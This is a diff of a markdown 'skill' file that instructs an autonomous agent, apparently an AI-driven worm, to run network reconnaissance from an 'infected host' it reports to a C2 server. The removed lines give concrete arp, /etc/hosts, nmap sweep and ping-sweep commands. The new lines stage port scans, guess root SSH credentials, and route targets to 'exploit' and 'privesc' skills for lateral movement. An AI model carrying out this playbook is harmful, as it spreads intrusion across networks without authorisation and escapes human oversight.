@@ -1,41 +1,31 @@
-## Recon Skill
+# Network Reconnaissance
 
-Objective: Discover all live hosts reachable from the infected host and identify the services they expose.
+**Objective:** Discover live hosts and identify their services.
 
-### Phase 1 — On initial registration (no results yet)
+## Passive Discovery
 
-Issue passive neighbor discovery commands to reveal hosts already in caches:
-- "arp -a"
-- "ip neigh show"
-- "cat /etc/hosts"
+Read what the OS already knows — ARP cache, neighbour tables, local host files. No active probing, completes instantly.
 
-### Phase 2 — When you receive ARP or neighbor results
+## Active Sweep
 
-Determine the local subnet from the host's IP (e.g., if the host is 10.x.x.y, sweep 10.x.x.0/24).
+Derive the local subnet from the host's IP and sweep the full /24 for live hosts. Wait for results before continuing.
 
-If "nmap" is in the host's tools list, issue a host discovery sweep:
-- "nmap -sn <local_subnet>/24"
+## Service Enumeration
 
-If nmap is not available, issue a fast ping sweep for the first 30 host addresses:
-- "for i in $(seq 1 30); do (ping -c1 -W1 <subnet>.$i &>/dev/null && echo <subnet>.$i alive) & done; wait"
+Scan each live, uncompromised, non-C2 IP. Escalate only when the current stage returns nothing actionable:
 
-After dispatching, return [] — do not issue further recon commands until sweep results arrive.
+1. **Top 100** — standard baseline; catches SSH, HTTP, and non-standard ports (5000, 8080, 8443, etc.). Act immediately on any usable service found.
+2. **Top 1000** — escalate only if top-100 found nothing and uncompromised hosts remain.
 
-### Phase 3 — When you receive host discovery results
+Record results with `store_open_ports`. Wait for each stage before issuing the next.
 
-For each live IP that is NOT already in already_infected and is not the local C2 address (compare against the C2_HOST env var), issue a service port scan:
-- "nmap --top-ports 1000 <ip1> <ip2> ..."
+## Routing From Scan Results
 
-Scan specific IPs only — do not pass a /24 range to this scan.
-After dispatching the port scan, return [] — do not issue further commands until results arrive.
+- **Remote shell access** — try credentials (root first, then extracted usernames). Stop after two failed attempts and probe other services.
+- **Web service** — use `read_skill("exploit")`. Prefer SSH if credentials are already known.
+- **Non-root shell** — use `read_skill("privesc")` before lateral moves requiring privileged files.
+- **SSH exhausted (>2 failures)** — escalate to top-1000 or probe other discovered services.
 
-### Phase 4 — When you receive port scan results
+## Discipline
 
-Recon is complete. Return [].
-
-Interpret the scan to choose the next action:
-- SSH only (port 22) → lateral movement via SSH (see lateral.md)
-- HTTP/web service on a non-standard port → web exploitation (see exploit.md)
-- Git daemon or similar version control service → supply chain technique (see lateral.md)
-
-Do not re-issue any command already in this host's command history.
+Record every IP with `add_discovered_ip` even if not acting on it yet.
